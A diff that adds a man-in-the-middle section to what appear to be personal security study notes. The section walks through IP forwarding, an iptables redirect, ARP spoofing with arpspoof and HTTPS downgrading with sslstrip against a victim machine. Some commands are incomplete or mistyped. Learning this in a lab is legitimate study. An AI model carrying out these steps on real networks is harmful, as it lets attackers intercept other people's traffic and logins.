@@ -42,3 +42,35 @@
     Check for word in a response
       - resp.string==ayhaga
 </details>
+
+
+<details>
+  <summary>MITM</summary>
+
+    - linux tool that analyz the packets with wireshark
+    - The Network adapter should be Bridged
+    
+      Step 1: We should set our machine in forwarding mode so that our machine has the capacity to forward each packet that was not expected for your machine.
+        #  echo 1 > /proc/sys/net/ipv4/ip_forward 
+      
+      Step 2: Need to set iptables to redirect traffic from port 80 to port 8080 to ensure outgoing connections to sslstrip.
+        #  iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080
+      
+      Step 3: Need to find our Network Gateway.
+        # route -n
+      
+      Step 4: Next we need to find our target machine’s IP address
+      
+      Step 5: ARP spoofing is a technique by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area network.
+        # arpspoof -i -t 
+      
+      Step6: Now we need to listen to port 8080, by opening a new terminal window.
+        # sslstrip -l 8080
+      
+      Step 7: Now we should go to the victim machine and for Ex type facebook.com in the browser as we know Facebook will go with HTTPS, but now check with the             victim machine, we can see the connection established through HTTP.
+
+
+</details>
+
+
+
